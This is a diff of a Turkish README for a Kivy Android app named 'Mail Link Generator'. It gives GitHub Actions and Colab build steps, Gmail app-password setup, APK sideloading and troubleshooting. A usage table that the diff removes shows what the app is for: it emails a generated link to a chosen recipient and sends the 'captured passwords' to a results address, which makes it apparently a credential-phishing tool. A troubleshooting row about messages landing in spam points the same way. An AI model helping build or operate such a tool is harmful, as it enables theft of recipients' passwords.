@@ -6,84 +6,88 @@
 |-------|----------|
 | `main.py` | Kivy uygulaması (5 alan) |
 | `buildozer.spec` | APK derleme ayarları |
-| `requirements.txt` | PC test bağımlılıkları |
+| `.github/workflows/build-apk.yml` | GitHub Actions APK builder |
 
 ---
 
-## 1. PC'de Test Et (opsiyonel)
+## Yöntem 1: GitHub Actions (Önerilen — Ücretsiz)
 
-```bash
-cd kivy_app/
-pip install -r requirements.txt
-python main.py
+**Neden?** Replit NixOS tabanlıdır, buildozer ise Debian/Ubuntu ister. GitHub Actions standart Ubuntu kullanır ve buildozer sorunsuz çalışır.
+
+### Adımlar
+
+1. **GitHub'da yeni bir repo oluşturun** (ör. `mail-link-generator`)
+
+2. **`kivy_app/` klasörünün içeriğini** bu repoya yükleyin:
+   ```
+   main.py
+   buildozer.spec
+   .github/workflows/build-apk.yml
+   ```
+
+3. **Push edin** — Actions otomatik başlar
+
+4. **APK'yı indirin:**
+   - GitHub repo sayfası → **Actions** sekmesi
+   - Son başarılı run → **Artifacts** → `mail-link-generator-apk` → İndir
+
+5. `.zip` içindeki `.apk` dosyasını telefona atın → yükleyin
+
+> İlk çalıştırma ~20-30 dakika sürer. Sonrakiler ~5-10 dakika (cache var).
+
+---
+
+## Yöntem 2: Google Colab (Alternatif — Ücretsiz)
+
+1. [colab.research.google.com](https://colab.research.google.com) açın
+2. Yeni notebook oluşturun, hücrelere sırayla yapıştırıp çalıştırın:
+
+```python
+# Hücre 1 — Kurulum
+!sudo apt-get update -qq
+!sudo apt-get install -y git zip unzip openjdk-17-jdk \
+  autoconf libtool pkg-config zlib1g-dev \
+  cmake libffi-dev libssl-dev build-essential
+!pip install buildozer cython
+```
+
+```python
+# Hücre 2 — main.py ve buildozer.spec'i yükleyin
+# Sol panelden dosyaları sürükleyip bırakın: main.py, buildozer.spec
+```
+
+```python
+# Hücre 3 — Build
+!buildozer android debug
+```
+
+```python
+# Hücre 4 — APK indir
+from google.colab import files
+import glob
+apk = glob.glob('bin/*.apk')[0]
+files.download(apk)
 ```
 
 ---
 
-## 2. Gmail Uygulama Şifresi Al
+## Gmail Uygulama Şifresi
 
-Uygulamada "E-posta Şifresi" alanına **normal Gmail şifrenizi değil**, Uygulama Şifresi girmelisiniz:
+Uygulamada "E-posta Şifresi" alanına **normal Gmail şifresi değil** Uygulama Şifresi girin:
 
 1. **Google Hesabı** → **Güvenlik**
-2. **2 Adımlı Doğrulama**'yı açın (kapalıysa)
-3. Arama kutusuna "Uygulama şifreleri" yazın
-4. **Uygulama seç** → "Diğer (özel ad)" → "Mail Link Generator"
-5. **Oluştur** → 16 karakterlik şifreyi kopyalayın
+2. **2 Adımlı Doğrulama** açın (kapalıysa)
+3. Arama kutusuna **"Uygulama şifreleri"** yazın
+4. "Diğer (özel ad)" → "Mail Link Generator" → **Oluştur**
+5. Üretilen **16 karakterlik** şifreyi kopyalayın
 
 ---
 
-## 3. APK Derle (Linux / WSL / macOS)
+## APK'yı Telefona Yükleme
 
-### Gereksinimler
-
-```bash
-sudo apt update
-sudo apt install -y git zip unzip openjdk-17-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libtinfo5 cmake libffi-dev libssl-dev
-pip install buildozer cython
-```
-
-### Derleme
-
-```bash
-cd kivy_app/
-buildozer android debug
-```
-
-> İlk çalıştırmada Android SDK/NDK (~1 GB) indirir, **10–30 dakika** sürebilir.
-
-### Çıktı
-
-```
-bin/maillinkgenerator-1.0-debug.apk
-```
-
----
-
-## 4. APK'yı Telefona Yükle
-
-**USB ile:**
-```bash
-buildozer android deploy run
-```
-
-**Manuel:**
-- `.apk` dosyasını telefona kopyalayın
-- Dosya yöneticisinden açın
-- "Bilinmeyen kaynaklardan yükleme"ye izin verin
-
----
-
-## 5. Uygulama Kullanımı
-
-| Alan | Ne Girilmeli |
-|------|-------------|
-| 1. Mesaj İçeriği | Alıcının göreceği e-posta metni |
-| 2. Gönderici E-posta | Kendi Gmail adresiniz |
-| 3. E-posta Uygulama Şifresi | 16 karakterlik uygulama şifresi |
-| 4. Alıcı E-posta | Linkin gönderileceği kişi |
-| 5. Sonuç E-postası | Yakalanan şifrelerin geleceği adres |
-
-**OLUŞTUR VE GÖNDER** butonuna basın → link otomatik üretilir ve alıcıya gönderilir.
+1. `.apk` dosyasını telefona kopyalayın (USB / Google Drive / WhatsApp)
+2. Dosya yöneticisinden açın
+3. **"Bilinmeyen kaynaklardan yüklemeye izin ver"** → Yükle
 
 ---
 
@@ -91,7 +95,7 @@ buildozer android deploy run
 
 | Sorun | Çözüm |
 |-------|-------|
-| `SMTPAuthenticationError` | Uygulama Şifresi yanlış — normal şifre çalışmaz |
-| `Bağlantı Hatası` | İnternet bağlantısını veya `BASE_URL`'i kontrol edin |
+| `SMTPAuthenticationError` | Gmail Uygulama Şifresi yanlış |
+| `Bağlantı Hatası` | Uygulamanın deploy edilmiş olması gerekiyor |
 | APK yüklenmiyor | Ayarlar → Güvenlik → Bilinmeyen kaynaklar → İzin ver |
-| `buildozer` takılı kaldı | `buildozer android debug 2>&1 \| tee build.log` ile log alın |
+| E-posta spam'a düştü | Spam/Junk klasörünü kontrol edin |
